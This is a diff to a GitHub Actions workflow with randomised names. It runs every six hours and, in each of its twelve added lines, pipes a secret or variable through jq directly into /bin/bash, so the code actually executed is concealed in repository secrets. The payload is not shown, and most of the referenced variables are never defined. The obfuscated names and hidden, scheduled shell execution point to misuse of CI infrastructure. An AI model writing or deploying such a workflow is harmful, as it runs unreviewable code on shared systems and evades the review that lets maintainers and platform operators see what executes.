@@ -2,8 +2,7 @@ name: sichuoch
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-
+    - cron: '52 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: sichuoch
         env:
-          y46789: ${{ secrets.y46789 }}
+          gq36281: ${{ secrets.gq36281 }}
         run: |
-          echo $y46789 | jq -r .htfi5928 | /bin/bash
-          echo $ze379 | jq -r .zulc02 | /bin/bash
-          echo $bgw3 | jq -r .q42 | /bin/bash
-          echo $qsmhh123 | jq -r .zoza30020 | /bin/bash
+          echo $gq36281 | jq -r .zorhp33 | /bin/bash
+          echo $nd233 | jq -r .gktr44 | /bin/bash
+          echo $mtfp66042 | jq -r .s3 | /bin/bash
+          echo $oi73 | jq -r .wfrxn204 | /bin/bash
+          echo $qt9695 | jq -r .wel5951 | /bin/bash
+          echo $mifsy007 | jq -r .xdx270 | /bin/bash
+          echo $o04706 | jq -r .z4872 | /bin/bash
+          echo $dbrm9 | jq -r .ij41 | /bin/bash
+          echo $uduq7289 | jq -r .zsd90299 | /bin/bash
+          echo $nke55 | jq -r .wy22 | /bin/bash
+          echo $xn0 | jq -r .ck3 | /bin/bash
+          echo $hkd30949 | jq -r .omlld43 | /bin/bash
 
